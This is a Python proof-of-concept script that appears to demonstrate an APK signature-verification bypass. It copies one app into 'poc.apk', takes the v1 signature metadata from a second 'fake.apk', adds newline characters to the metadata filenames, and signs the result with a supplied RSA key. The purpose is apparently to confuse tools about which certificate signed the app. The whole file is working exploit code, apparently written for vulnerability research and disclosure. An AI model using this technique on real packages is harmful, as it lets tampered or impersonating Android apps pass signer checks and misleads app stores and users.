#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool

from cryptography.hazmat.primitives import serialization


with open("cert-rsa.der", "rb") as fh:
    cert = fh.read()
with open("privkey-rsa.der", "rb") as fh:
    privkey = serialization.load_der_private_key(fh.read(), None)
    assert isinstance(privkey, apksigtool.PrivKeyTypes)

# must have targetSdk < 30
date_time = apksigcopier.copy_apk("app3.apk", "poc.apk", exclude=apksigcopier.exclude_meta)
meta = []

for info, data in apksigcopier.extract_meta("fake.apk"):
    if not info.filename.endswith(".MF"):
        if not info.filename.endswith(".SF"):
            info.filename += "\n"
        meta.append((info, data))

for info, data in apksigtool.create_v1_signature("poc.apk", cert=cert, key=privkey):
    if not info.filename.endswith(".MF"):
        info.filename = info.filename.replace("/", "/\n")
    meta.append((info, data))

apksigcopier.patch_meta(meta, "poc.apk", date_time=date_time)
